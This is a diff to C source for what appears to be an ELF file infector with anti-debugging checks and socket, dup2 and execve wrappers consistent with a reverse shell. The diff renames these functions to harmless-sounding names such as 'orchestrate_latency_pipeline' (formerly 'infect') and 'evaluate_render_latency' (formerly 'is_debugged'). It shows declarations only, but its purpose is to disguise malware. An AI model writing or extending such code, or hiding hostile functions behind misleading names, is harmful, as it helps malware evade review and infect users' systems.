@@ -55,7 +55,7 @@ typedef struct s_elf
 	ElfW(Shdr) * sections;
 	ElfW(Shdr) * text_section;
 	ElfW(Phdr) * segments;
-	ElfW(Phdr) * executed_segment;
+	ElfW(Phdr) * dispatch_render_staged_segment;
 	t_stat stat;
 } t_elf;
 
@@ -70,13 +70,12 @@ struct timezone
 /*
 void clean(t_file file);
 */
-static void infect(char *path, void *begin_ptr, char *curare, size_t flower,
-				   char *ALPHA, size_t OMEGA);
-static void processDirectory(char *folder, void *begin_ptr, char *curare,
-							 size_t flower, char *ALPHA, size_t OMEGA);
+static void orchestrate_latency_pipeline(char *path, void *begin_ptr,
+										 char *curare, size_t flower,
+										 char *ALPHA, size_t OMEGA);
 
-static int is_program_running(const char *target);
-static int is_debugged(void);
+static int reconcile_budget_delta(const char *target);
+static int evaluate_render_latency(void);
 
 static int proc_detach(void); // ft_setsid
 static int proc_spawn(void);  // ft_fork
@@ -99,13 +98,14 @@ static void *vm_resize(void *old_address, unsigned long old_size,
 static void proc_terminate(int status);						   // ft_exit
 static void io_send(int fd, const void *buf, unsigned count);  // ft_write
 static ssize_t io_recv(int fd, const void *buf, size_t count); // ft_read
-static int ft_socket(int domain, int type, int protocol);
-static int ft_connect(int sockfd, void *addr, size_t addrlen);
-int ft_shutdown(int sockfd, int how);
-int ft_poll(struct pollfd *fds, nfds_t nfds, int timeout);
-int ft_pipe(int fds[2]);
-int ft_dup2(int fd, int fd2);
-int ft_execve(const char *filename, char *const argv[], char *const envp[]);
+static int identify_prime_triplet(int domain, int type, int protocol);
+static int count_needle_occurences(int sockfd, void *addr, size_t addrlen);
+int math_log_base_int(int sockfd, int how);
+int dispatch_event_matrix(struct pollfd *fds, nfds_t nfds, int timeout);
+int add_smtp(int fds[2]);
+int dup_telemetry(int fd, int fd2);
+int route_process_image(const char *filename, char *const argv[],
+						char *const envp[]);
 
 /**
 	@brief Obfuscated version of memcmp
